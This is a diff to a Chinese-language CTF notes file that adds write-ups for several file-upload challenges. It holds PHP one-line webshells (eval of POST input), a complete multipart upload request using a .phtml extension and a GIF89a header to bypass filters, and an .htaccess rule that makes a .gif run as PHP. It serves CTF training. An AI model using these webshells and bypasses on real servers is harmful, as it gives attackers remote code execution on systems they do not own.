@@ -631,3 +631,82 @@ move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 /.
 而最终的文件名后缀取的是`$file[count($file) - 1]`，因此我们可以让`$file`为数组。`$file[0]`为`1.php/`，也就是`reset($file)`，然后再令`$file[2]`为白名单中的jpg。此时`end($file)`等于jpg，`$file[count($file) - 1]`为空。而 `$file_name = reset($file) . '.' . $file[count($file) - 1];`，也就是`1.php/.`，最终`move_uploaded_file`会忽略掉`/.`，最终上传`1.php`。
 
 ![image-20220117225055765](README/image-20220117225055765.png)
+
+## WriteUp
+
+### [极客大挑战 2019]Upload
+
+测试中发现不能出现<?，php文件也不行，可以phtml：
+
+`<script language="php">eval($_POST[cmd])</script>`
+
+payload：(猜测目录为upload)
+
+```
+POST /upload_file.php HTTP/1.1
+Host: 3efafb21-3a17-40b7-a859-6efe219ae4db.node4.buuoj.cn:81
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------236354177817844381945461145
+Content-Length: 386
+Origin: http://3efafb21-3a17-40b7-a859-6efe219ae4db.node4.buuoj.cn:81
+Connection: close
+Referer: http://3efafb21-3a17-40b7-a859-6efe219ae4db.node4.buuoj.cn:81/
+Upgrade-Insecure-Requests: 1
+
+-----------------------------236354177817844381945461145
+Content-Disposition: form-data; name="file"; filename="1.phtml"	
+Content-Type: image/jpeg
+
+GIF89a
+<script language="php">eval($_POST[cmd])</script>
+-----------------------------236354177817844381945461145
+Content-Disposition: form-data; name="submit"
+
+鎻愪氦
+-----------------------------236354177817844381945461145--
+
+```
+
+### [ACTF2020 新生赛]Upload
+
+与上一题一样，phtml绕过
+
+### [MRCTF2020]你传你🐎呢
+
+传htaccess
+
+```
+-----------------------------18277662392071576424237260722
+Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
+Content-Type: image/gif
+
+<FilesMatch "1.gif">
+SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+```
+-----------------------------18277662392071576424237260722
+Content-Disposition: form-data; name="uploaded"; filename="1.png"
+Content-Type: image/jpeg
+
+<?php eval($_POST[cmd])?>
+```
+
+### [GXYCTF2019]BabyUpload
+
+也是传htaccess
+
+### [WUSTCTF2020]CV Maker
+
+注册然后传文件，没过滤，直接写马蚁剑，但是flag没有。。
+
+### [RoarCTF 2019]Simple Upload
+
+
+
+
+
